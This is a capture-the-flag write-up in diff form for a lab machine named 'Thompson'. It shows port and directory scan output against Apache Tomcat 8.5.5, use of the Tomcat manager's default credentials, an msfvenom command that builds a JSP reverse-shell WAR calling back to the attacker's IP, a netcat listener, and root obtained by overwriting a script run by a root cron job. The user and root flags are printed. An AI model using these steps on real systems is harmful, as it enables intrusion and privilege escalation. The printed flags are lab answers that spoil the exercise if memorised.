@@ -1,0 +1,236 @@
+Thompson ip:10.10.0.27
+
+
+1. Rustscan:
+
+rustscan -a 10.10.0.27            
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+I scanned ports so fast, even my computer was surprised.
+
+[~] The config file is expected to be at "/home/gabi/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.0.27:22
+Open 10.10.0.27:8009
+Open 10.10.0.27:8080
+[~] Starting Script(s)
+[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-01 08:14 EDT
+Initiating Ping Scan at 08:14
+Scanning 10.10.0.27 [4 ports]
+Completed Ping Scan at 08:14, 0.12s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 08:14
+Completed Parallel DNS resolution of 1 host. at 08:14, 13.01s elapsed
+DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Initiating SYN Stealth Scan at 08:14
+Scanning 10.10.0.27 [3 ports]
+Discovered open port 8080/tcp on 10.10.0.27
+Discovered open port 22/tcp on 10.10.0.27
+Discovered open port 8009/tcp on 10.10.0.27
+Completed SYN Stealth Scan at 08:14, 0.19s elapsed (3 total ports)
+Nmap scan report for 10.10.0.27
+Host is up, received echo-reply ttl 63 (0.12s latency).
+Scanned at 2025-04-01 08:14:38 EDT for 0s
+
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8009/tcp open  ajp13      syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
+
+
+
+DIRB:
+dirb http://10.10.0.27:8080  /usr/share/wordlists/dirb/small.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  1 08:18:42 2025
+URL_BASE: http://10.10.0.27:8080/
+WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt
+
+-----------------
+
+GENERATED WORDS: 959                                                           
+
+---- Scanning URL: http://10.10.0.27:8080/ ----
++ http://10.10.0.27:8080/docs (CODE:302|SIZE:0)                                                                                         
++ http://10.10.0.27:8080/examples (CODE:302|SIZE:0)                                                                                     
++ http://10.10.0.27:8080/manager (CODE:302|SIZE:0)                                                                                      
+                                                                                                                                        
+-----------------
+END_TIME: Tue Apr  1 08:20:28 2025
+DOWNLOADED: 959 - FOUND: 3
+
+
+go to /manager
+see the user and pass
+
+
+
+
+
+
+
+
+
+ You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.
+
+For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.
+
+<role rolename="manager-gui"/>
+<user username="tomcat" password="s3cret" roles="manager-gui"/>
+
+Note that for Tomcat 7 onwards, the roles required to use the manager application were changed from the single manager role to the following four roles. You will need to assign the role(s) required for the functionality you wish to access.
+
+    manager-gui - allows access to the HTML GUI and the status pages
+    manager-script - allows access to the text interface and the status pages
+    manager-jmx - allows access to the JMX proxy and the status pages
+    manager-status - allows access to the status pages only
+
+The HTML interface is protected against CSRF but the text and JMX interfaces are not. To maintain the CSRF protection:
+
+    Users with the manager-gui role should not be granted either the manager-script or manager-jmx roles.
+    If the text or jmx interfaces are accessed through a browser (e.g. for testing since these interfaces are intended for tools not humans) then the browser must be closed afterwards to terminate the session.
+
+For more information - please see the Manager App HOW-TO. 
+
+Nmap:
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
+|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
+|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
+8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Apache Tomcat/8.5.5
+|_http-favicon: Apache Tomcat
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=4/1%OT=22%CT=1%CU=35200%PV=Y%DS=2%DC=T%G=Y%TM=67EBD
+OS:8DB%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)S
+OS:EQ(SP=103%GCD=1%ISR=10E%TI=Z%II=I%TS=8)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=
+OS:I%TS=8)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O
+OS:2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
+OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
+OS:6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
+OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
+OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
+OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 198.841 days (since Sat Sep 14 12:04:06 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   178.12 ms 10.8.0.1
+2   199.08 ms 10.10.0.27
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:15
+Completed NSE at 08:15, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:15
+Completed NSE at 08:15, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:15
+Completed NSE at 08:15, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.66 seconds
+           Raw packets sent: 1389 (65.564KB) | Rcvd: 1090 (47.568KB)
+
+
+
+
+Initial foothold:
+
+after logging with the correct credentials, there is a posibility to upload a war file:
+
+create a payload: 
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.76.182 LPORT=4444 -f war > exploit.war
+Payload size: 1100 bytes
+Final size of war file: 1100 bytes
+
+
+start a nc listener:
+nc -lvnp 4444:
+
+listening on [any] 4444 ...
+connect to [10.8.76.182] from (UNKNOWN) [10.10.0.27] 37406
+whoami
+tomcat
+
+
+cat user.txt 
+39400c90bc683a41a8935e4719f181bf
+
+cat root.txt
+d89d5391984c0450a95497153ae7ca3a
+
+
+cat test.txt
+uid=0(root) gid=0(root) groups=0(root)
+crontab -e
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    cd /home/jack && bash id.sh
+#
+echo "cp /root/root.txt /home/jack/root.txt"> id.sh
+ls
+id.sh
+test.txt
+user.txt
+echo "cp /root/root.txt /home/jack/root.txt" > id.sh
+ls
+id.sh
+test.txt
+user.txt
+^[[A
+ls
+id.sh
+root.txt
+test.txt
+user.txt
+cat root.txt
+d89d5391984c0450a95497153ae7ca3a
+
